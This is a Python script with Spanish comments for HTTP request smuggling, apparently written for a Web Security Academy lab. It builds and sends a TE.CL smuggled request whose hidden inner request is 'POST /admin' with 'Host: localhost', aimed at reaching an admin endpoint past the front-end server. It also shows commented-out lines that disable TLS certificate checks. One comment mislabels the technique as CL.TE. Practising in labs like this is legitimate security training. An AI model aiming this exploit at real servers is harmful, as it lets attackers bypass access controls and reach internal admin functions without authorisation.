#!/usr/bin/env python3
"""
Envío de peticiones HTTP crudas por el socket (HTTP y HTTPS).
Pensado para HTTP request smuggling: NADIE normaliza tus cabeceras.

Uso:
    python raw_socket.py

Cambia HOST / PORT / USE_TLS y la variable `request` de abajo.
"""
import socket
import ssl

HOST = "0aba007f03e8d22880637bb200a80066.web-security-academy.net"  # <-- tu lab
PORT = 443
USE_TLS = True          # True para HTTPS, False para HTTP
TIMEOUT = 10            # segundos; sube si esperas time-out del smuggling


def send_raw(host: str, port: int, raw: bytes, use_tls: bool = True,
             timeout: float = TIMEOUT, read_all: bool = True) -> bytes:
    """Abre el socket, envia los bytes EXACTOS y devuelve la respuesta cruda."""
    sock = socket.create_connection((host, port), timeout=timeout)
    if use_tls:
        ctx = ssl.create_default_context()
        # En labs con certificados raros puedes relajar la verificacion:
        # ctx.check_hostname = False
        # ctx.verify_mode = ssl.CERT_NONE
        sock = ctx.wrap_socket(sock, server_hostname=host)

    try:
        sock.sendall(raw)
        chunks = []
        while True:
            try:
                data = sock.recv(4096)
            except socket.timeout:
                break            # normal en smuggling: el server se queda esperando
            if not data:
                break
            chunks.append(data)
            if not read_all:
                break
        return b"".join(chunks)
    finally:
        sock.close()


# ---------------------------------------------------------------------------
# La peticion CRUDA. Ojo: cada linea termina en \r\n, y el cuerpo va tras \r\n\r\n
# Ejemplo clasico de CL.TE (Content-Length vs Transfer-Encoding):
# ---------------------------------------------------------------------------
smuggled_body = (
    "POST /admin HTTP/1.1\r\n"
    #f"Host: {HOST}\r\n"
    "Host: localhost\r\n"
    "Content-Type: application/x-www-form-urlencoded\r\n"
    "Content-Length: 15\r\n"
    "\r\n"
    "x=1"
)

# Tamano del chunk = longitud del smuggled_body en HEX (sin 0x)
chunk_size = format(len(smuggled_body.encode("latin-1")), "x")  # p.ej. "60"

# Linea del tamano del chunk, tal cual viaja por el cable
chunk_line = f"{chunk_size}\r\n"

body = (
    f"{chunk_line}"
    f"{smuggled_body}"
    "\r\n"
    "0\r\n"
    "\r\n"                 # <-- lo que sigue se "cuela" en la siguiente peticion
)

# TE.CL: el back-end usa Content-Length -> debe leer SOLO la linea del tamano del
# chunk. Por eso CL = longitud de esa linea (incluido su \r\n). Se calcula solo:
content_length = len(chunk_line.encode("latin-1"))  # "60\r\n" -> 4

request = (
    f"POST / HTTP/1.1\r\n"
    f"Host: {HOST}\r\n"
    f"Content-Type: application/x-www-form-urlencoded\r\n"
    f"Content-Length: {content_length}\r\n"
    f"Transfer-Encoding: chunked\r\n"
    f"\r\n"
    f"{body}"
).encode("latin-1")   # latin-1 = 1 byte por caracter, asi len() cuadra siempre


if __name__ == "__main__":
    print(f"[*] Conectando a {HOST}:{PORT} (TLS={USE_TLS})")
    print("[*] Peticion enviada:\n" + "-" * 40)
    print(request.decode("latin-1"))
    print("-" * 40)

    resp = send_raw(HOST, PORT, request, use_tls=USE_TLS)
    print(f"[*] Respuesta ({len(resp)} bytes):\n" + "=" * 40)
    print(resp.decode("latin-1", errors="replace"))
